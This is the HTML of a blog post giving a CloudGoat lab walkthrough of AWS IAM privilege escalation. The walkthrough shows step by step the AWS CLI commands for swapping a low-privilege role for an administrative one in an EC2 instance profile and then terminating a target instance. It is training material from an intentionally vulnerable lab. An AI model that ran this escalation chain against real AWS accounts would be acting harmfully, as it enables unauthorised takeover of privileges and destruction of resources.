@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege EscalationDescription: This comprehensive walkthrough demonstrates how to exploit IAM privilege escalation vulnerab">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CloudGoat-Iam_Privesc_By_Attachment">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege EscalationDescription: This comprehensive walkthrough demonstrates how to exploit IAM privilege escalation vulnerab">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Iam_Privesc_By_Attachment/ec2_info.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Iam_Privesc_By_Attachment/role_policy.png">
+<meta property="article:published_time" content="2025-06-02T22:30:19.000Z">
+<meta property="article:modified_time" content="2025-06-02T19:32:19.947Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="AWS">
+<meta property="article:tag" content="CloudGoat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Iam_Privesc_By_Attachment/ec2_info.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/web-app-manifest-192x192.png">
+        
+      
+    
+    <!-- title -->
+    <title>CloudGoat-Iam_Privesc_By_Attachment</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/02/CloudGoat-Cloud-Breach-S3/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&text=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&is_video=false&description=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CloudGoat-Iam_Privesc_By_Attachment&body=Check out this article: https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&title=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&name=CloudGoat-Iam_Privesc_By_Attachment&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/06/03/CloudGoat-Iam-Privesc-By-Attachment/&t=CloudGoat-Iam_Privesc_By_Attachment"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-iam-privesc-by-attachment-Walkthrough-Complete-Guide-to-AWS-IAM-Privilege-Escalation"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup-and-Configuration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup and Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance-with-CloudTap"><span class="toc-number">1.2.</span> <span class="toc-text">Reconnaissance with CloudTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IAM-Instance-Profile-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">IAM Instance Profile Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Role-Policy-Analysis"><span class="toc-number">1.4.</span> <span class="toc-text">Role Policy Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-the-Privilege-Escalation-Vector"><span class="toc-number">1.5.</span> <span class="toc-text">Understanding the Privilege Escalation Vector</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prerequisites-for-EC2-Instance-Creation"><span class="toc-number">1.6.</span> <span class="toc-text">Prerequisites for EC2 Instance Creation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Subnet-Information"><span class="toc-number">1.6.1.</span> <span class="toc-text">1. Subnet Information</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Security-Group-Configuration"><span class="toc-number">1.6.2.</span> <span class="toc-text">2. Security Group Configuration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH-Key-Pair-Creation"><span class="toc-number">1.6.3.</span> <span class="toc-text">3. SSH Key Pair Creation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Creating-the-Exploitation-EC2-Instance"><span class="toc-number">1.7.</span> <span class="toc-text">Creating the Exploitation EC2 Instance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IAM-Role-Escalation-Through-Instance-Profile-Manipulation"><span class="toc-number">1.8.</span> <span class="toc-text">IAM Role Escalation Through Instance Profile Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Remove-the-Low-Privilege-Role"><span class="toc-number">1.8.1.</span> <span class="toc-text">Remove the Low-Privilege Role:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attach-the-High-Privilege-Role"><span class="toc-number">1.8.2.</span> <span class="toc-text">Attach the High-Privilege Role:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Accessing-the-Compromised-Instance"><span class="toc-number">1.9.</span> <span class="toc-text">Accessing the Compromised Instance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Set-proper-permissions-for-the-SSH-key"><span class="toc-number">1.9.1.</span> <span class="toc-text">1. Set proper permissions for the SSH key:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Retrieve-the-public-IP-address"><span class="toc-number">1.9.2.</span> <span class="toc-text">2. Retrieve the public IP address:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SSH-into-the-instance"><span class="toc-number">1.9.3.</span> <span class="toc-text">3. SSH into the instance:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation-Privilege-Verification-and-Target-Elimination"><span class="toc-number">1.10.</span> <span class="toc-text">Post-Exploitation: Privilege Verification and Target Elimination</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enumerate-the-Escalated-Privileges"><span class="toc-number">1.10.1.</span> <span class="toc-text">Enumerate the Escalated Privileges:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mission-Completion-Target-Termination"><span class="toc-number">1.10.2.</span> <span class="toc-text">Mission Completion: Target Termination</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cleanup-and-Environment-Destruction"><span class="toc-number">1.11.</span> <span class="toc-text">Cleanup and Environment Destruction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Terminate-the-Exploitation-EC2-Instance"><span class="toc-number">1.11.1.</span> <span class="toc-text">1. Terminate the Exploitation EC2 Instance</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Destroy-the-CloudGoat-Environment"><span class="toc-number">1.11.2.</span> <span class="toc-text">2. Destroy the CloudGoat Environment</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        CloudGoat-Iam_Privesc_By_Attachment
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-06-02T22:30:19.000Z" class="dt-published" itemprop="datePublished">2025-06-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/AWS/" rel="tag">AWS</a>, <a class="p-category" href="/tags/CloudGoat/" rel="tag">CloudGoat</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="CloudGoat-iam-privesc-by-attachment-Walkthrough-Complete-Guide-to-AWS-IAM-Privilege-Escalation"><a href="#CloudGoat-iam-privesc-by-attachment-Walkthrough-Complete-Guide-to-AWS-IAM-Privilege-Escalation" class="headerlink" title="CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege Escalation"></a>CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege Escalation</h1><p><strong>Description:</strong> This comprehensive walkthrough demonstrates how to exploit IAM privilege escalation vulnerabilities in AWS using CloudGoat’s iam_privesc_by_attachment scenario. Learn advanced AWS penetration testing techniques with CloudTap, a powerful enumeration tool, to escalate privileges and terminate EC2 instances through IAM role manipulation.</p>
+<hr>
+<h2 id="Initial-Setup-and-Configuration"><a href="#Initial-Setup-and-Configuration" class="headerlink" title="Initial Setup and Configuration"></a>Initial Setup and Configuration</h2><p>First, let’s configure our CloudGoat environment by whitelisting our IP address:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat config whitelist --auto</span><br></pre></td></tr></table></figure>
+
+<p>Next, we’ll create the vulnerable environment:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat create iam_privesc_by_attachment</span><br></pre></td></tr></table></figure>
+
+<p>Upon successful deployment, we receive our initial access credentials:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[cloudgoat] terraform output completed with no error code.</span><br><span class="line">cloudgoat_output_aws_account_id = [REDACTED]</span><br><span class="line">cloudgoat_output_kerrigan_access_key_id = [REDACTED]</span><br><span class="line">cloudgoat_output_kerrigan_secret_key = [REDACTED]</span><br></pre></td></tr></table></figure>
+
+<p><strong>Mission Objective:</strong> Delete the EC2 instance named “cg-super-critical-security-server”</p>
+<h2 id="Reconnaissance-with-CloudTap"><a href="#Reconnaissance-with-CloudTap" class="headerlink" title="Reconnaissance with CloudTap"></a>Reconnaissance with CloudTap</h2><p>For our initial enumeration, we’ll leverage <a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">CloudTap</a>, a powerful AWS reconnaissance tool that automates the discovery of cloud resources and misconfigurations.</p>
+<p>Configure the AWS profile:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws configure --profile init</span><br></pre></td></tr></table></figure>
+
+<p>Run CloudTap enumeration:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CloudTap.py --keys init</span><br></pre></td></tr></table></figure>
+
+<p>CloudTap reveals critical information about running EC2 instances:</p>
+<p><img src="/images/Iam_Privesc_By_Attachment/ec2_info.png" alt="EC2 Instance Information"></p>
+<h2 id="IAM-Instance-Profile-Discovery"><a href="#IAM-Instance-Profile-Discovery" class="headerlink" title="IAM Instance Profile Discovery"></a>IAM Instance Profile Discovery</h2><p>Through systematic enumeration, we discover that we can list instance profiles in the environment:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-instance-profiles --profile init</span><br></pre></td></tr></table></figure>
+
+<p>This reveals an important instance profile structure with associated IAM roles. The response shows us a key instance profile that will be crucial for our escalation path.</p>
+<h2 id="Role-Policy-Analysis"><a href="#Role-Policy-Analysis" class="headerlink" title="Role Policy Analysis"></a>Role Policy Analysis</h2><p>CloudTap successfully enumerates role policies, providing us with comprehensive information about the available IAM roles:</p>
+<p><img src="/images/Iam_Privesc_By_Attachment/role_policy.png" alt="Role Policy Information"></p>
+<p>The enumeration reveals two distinct IAM roles:</p>
+<ul>
+<li><code>cg-ec2-meek-role-&lt;CLOUD_GOAT_ID&gt;</code> </li>
+<li><code>cg-ec2-mighty-role-&lt;CLOUD_GOAT_ID&gt;</code></li>
+</ul>
+<p>The naming convention suggests a permission hierarchy, with “mighty” likely having elevated privileges compared to “meek.”</p>
+<h2 id="Understanding-the-Privilege-Escalation-Vector"><a href="#Understanding-the-Privilege-Escalation-Vector" class="headerlink" title="Understanding the Privilege Escalation Vector"></a>Understanding the Privilege Escalation Vector</h2><p>Direct enumeration of these roles fails with “Access Denied” errors. However, we can leverage a common AWS security misconfiguration: <strong>IAM role attachment to EC2 instances</strong>.</p>
+<p>Since IAM roles cannot be directly attached to EC2 instances (they require Instance Profiles), we need to:</p>
+<ol>
+<li>Create a new EC2 instance with an existing instance profile</li>
+<li>Modify the instance profile to use the higher-privileged role</li>
+<li>Use the EC2 instance to enumerate and exploit the elevated permissions</li>
+</ol>
+<h2 id="Prerequisites-for-EC2-Instance-Creation"><a href="#Prerequisites-for-EC2-Instance-Creation" class="headerlink" title="Prerequisites for EC2 Instance Creation"></a>Prerequisites for EC2 Instance Creation</h2><p>To successfully create our exploitation EC2 instance, we need:</p>
+<h3 id="1-Subnet-Information"><a href="#1-Subnet-Information" class="headerlink" title="1. Subnet Information"></a>1. Subnet Information</h3><p>Identify the subnet used by the target EC2 instance:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances \</span><br><span class="line">    --query <span class="string">&#x27;Reservations[*].Instances[*].[SubnetId]&#x27;</span> \</span><br><span class="line">    --output text --profile init</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Security-Group-Configuration"><a href="#2-Security-Group-Configuration" class="headerlink" title="2. Security Group Configuration"></a>2. Security Group Configuration</h3><p>Enumerate security groups to find one allowing SSH access:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-security-groups --profile init</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SSH-Key-Pair-Creation"><a href="#3-SSH-Key-Pair-Creation" class="headerlink" title="3. SSH Key Pair Creation"></a>3. SSH Key Pair Creation</h3><p>Generate a new key pair for secure access:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 create-key-pair \</span><br><span class="line">    --key-name exploitation-key \</span><br><span class="line">    --query <span class="string">&#x27;KeyMaterial&#x27;</span> \</span><br><span class="line">    --output text &gt; exploitation-key.pem \</span><br><span class="line">    --region us-east-1 \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure>
+
+<h2 id="Creating-the-Exploitation-EC2-Instance"><a href="#Creating-the-Exploitation-EC2-Instance" class="headerlink" title="Creating the Exploitation EC2 Instance"></a>Creating the Exploitation EC2 Instance</h2><p>With all prerequisites gathered, we can create our exploitation instance:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 run-instances \</span><br><span class="line">    --image-id ami-0a313d6098716f372 \</span><br><span class="line">    --instance-type t2.micro \</span><br><span class="line">    --iam-instance-profile Arn=[INSTANCE_PROFILE_ARN] \</span><br><span class="line">    --key-name exploitation-key \</span><br><span class="line">    --subnet-id [SUBNET_ID] \</span><br><span class="line">    --security-group-ids [SECURITY_GROUP_ID] \</span><br><span class="line">    --region us-east-1 \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure>
+
+<h2 id="IAM-Role-Escalation-Through-Instance-Profile-Manipulation"><a href="#IAM-Role-Escalation-Through-Instance-Profile-Manipulation" class="headerlink" title="IAM Role Escalation Through Instance Profile Manipulation"></a>IAM Role Escalation Through Instance Profile Manipulation</h2><p>Now comes the critical privilege escalation step. We’ll swap the “meek” role for the “mighty” role:</p>
+<h3 id="Remove-the-Low-Privilege-Role"><a href="#Remove-the-Low-Privilege-Role" class="headerlink" title="Remove the Low-Privilege Role:"></a>Remove the Low-Privilege Role:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws iam remove-role-from-instance-profile \</span><br><span class="line">    --instance-profile-name [INSTANCE_PROFILE_NAME] \</span><br><span class="line">    --role-name [MEEK_ROLE_NAME] \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure>
+
+<h3 id="Attach-the-High-Privilege-Role"><a href="#Attach-the-High-Privilege-Role" class="headerlink" title="Attach the High-Privilege Role:"></a>Attach the High-Privilege Role:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws iam add-role-to-instance-profile \</span><br><span class="line">    --instance-profile-name [INSTANCE_PROFILE_NAME] \</span><br><span class="line">    --role-name [MIGHTY_ROLE_NAME] \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure>
+
+<h2 id="Accessing-the-Compromised-Instance"><a href="#Accessing-the-Compromised-Instance" class="headerlink" title="Accessing the Compromised Instance"></a>Accessing the Compromised Instance</h2><h3 id="1-Set-proper-permissions-for-the-SSH-key"><a href="#1-Set-proper-permissions-for-the-SSH-key" class="headerlink" title="1. Set proper permissions for the SSH key:"></a>1. Set proper permissions for the SSH key:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 400 exploitation-key.pem</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Retrieve-the-public-IP-address"><a href="#2-Retrieve-the-public-IP-address" class="headerlink" title="2. Retrieve the public IP address:"></a>2. Retrieve the public IP address:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances \</span><br><span class="line">    --query <span class="string">&quot;Reservations[*].Instances[*].PublicIpAddress&quot;</span> \</span><br><span class="line">    --output text \</span><br><span class="line">    --profile init</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-SSH-into-the-instance"><a href="#3-SSH-into-the-instance" class="headerlink" title="3. SSH into the instance:"></a>3. SSH into the instance:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i exploitation-key.pem ubuntu@[PUBLIC_IP]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Post-Exploitation-Privilege-Verification-and-Target-Elimination"><a href="#Post-Exploitation-Privilege-Verification-and-Target-Elimination" class="headerlink" title="Post-Exploitation: Privilege Verification and Target Elimination"></a>Post-Exploitation: Privilege Verification and Target Elimination</h2><p>Once connected to the compromised EC2 instance, install the AWS CLI:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install awscli</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumerate-the-Escalated-Privileges"><a href="#Enumerate-the-Escalated-Privileges" class="headerlink" title="Enumerate the Escalated Privileges:"></a>Enumerate the Escalated Privileges:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aws iam list-policies --query <span class="string">&quot;Policies[?starts_with(PolicyName, &#x27;cg&#x27;)]&quot;</span></span><br><span class="line"></span><br><span class="line">aws iam get-policy-version \</span><br><span class="line">    --policy-arn <span class="string">&quot;arn:aws:iam::[ACCOUNT_ID]:policy/cg-ec2-mighty-policy&quot;</span> \</span><br><span class="line">    --version-id <span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>The policy analysis reveals that the <code>cg-ec2-mighty-role</code> provides administrative access to the AWS account.</p>
+<h3 id="Mission-Completion-Target-Termination"><a href="#Mission-Completion-Target-Termination" class="headerlink" title="Mission Completion: Target Termination"></a>Mission Completion: Target Termination</h3><p>With administrative privileges confirmed, locate and terminate the target instance:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 describe-instances --region us-east-1</span><br><span class="line">aws ec2 terminate-instances --instance-ids [TARGET_INSTANCE_ID] --region us-east-1</span><br></pre></td></tr></table></figure>
+
+<h2 id="Cleanup-and-Environment-Destruction"><a href="#Cleanup-and-Environment-Destruction" class="headerlink" title="Cleanup and Environment Destruction"></a>Cleanup and Environment Destruction</h2><p><strong>Important Disclaimer</strong>: After completing this walkthrough, ensure you clean up all resources to avoid unnecessary charges and maintain a clean environment.</p>
+<h3 id="1-Terminate-the-Exploitation-EC2-Instance"><a href="#1-Terminate-the-Exploitation-EC2-Instance" class="headerlink" title="1. Terminate the Exploitation EC2 Instance"></a>1. Terminate the Exploitation EC2 Instance</h3><p>Delete the EC2 instance you created during the privilege escalation process:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws ec2 terminate-instances --instance-ids [YOUR_EXPLOITATION_INSTANCE_ID] --region us-east-1 --profile init</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Destroy-the-CloudGoat-Environment"><a href="#2-Destroy-the-CloudGoat-Environment" class="headerlink" title="2. Destroy the CloudGoat Environment"></a>2. Destroy the CloudGoat Environment</h3><p>Once you’ve completed the walkthrough and cleaned up your exploitation resources, destroy the entire CloudGoat scenario:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cloudgoat destroy iam_privesc_by_attachment</span><br></pre></td></tr></table></figure>
+
+<p>This command will remove all AWS resources created by the CloudGoat scenario, ensuring no residual infrastructure remains.</p>
+<p><em>This walkthrough is part of a comprehensive AWS penetration testing series. For more cloud security content and tools like CloudTap, visit our <a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr/CloudTap">GitHub repository</a>.</em></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CloudGoat-iam-privesc-by-attachment-Walkthrough-Complete-Guide-to-AWS-IAM-Privilege-Escalation"><span class="toc-number">1.</span> <span class="toc-text">CloudGoat iam_privesc_by_attachment Walkthrough: Complete Guide to AWS IAM Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Setup-and-Configuration"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Setup and Configuration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reconnaissance-with-CloudTap"><span class="toc-number">1.2.</span> <span class="toc-text">Reconnaissance with CloudTap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IAM-Instance-Profile-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">IAM Instance Profile Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Role-Policy-Analysis"><span class="toc-number">1.4.</span> <span class="toc-text">Role Policy Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-the-Privilege-Escalation-Vector"><span class="toc-number">1.5.</span> <span class="toc-text">Understanding the Privilege Escalation 